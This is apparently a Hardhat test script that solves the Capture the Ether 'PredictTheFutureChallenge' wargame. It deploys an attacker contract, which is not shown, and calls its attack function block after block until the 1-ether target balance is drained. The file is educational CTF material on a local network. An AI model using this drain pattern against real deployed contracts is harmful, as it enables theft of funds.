import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheFutureChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheFutureChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    let malware = await (
      await ethers.getContractFactory('PredictTheFutureAttack', attacker)
    ).deploy(target.address, { value: utils.parseEther('1') });
    await malware.deployed();

    while (await target.isComplete() === false) {
      try {
        let tx = await malware.attack();
        await tx.wait();
      } catch (e) {}
      console.log(`block number: ${await provider.getBlockNumber()}`);
    }
    

    expect(await provider.getBalance(target.address)).to.equal(0);
    expect(await target.isComplete()).to.equal(true);
  });
});
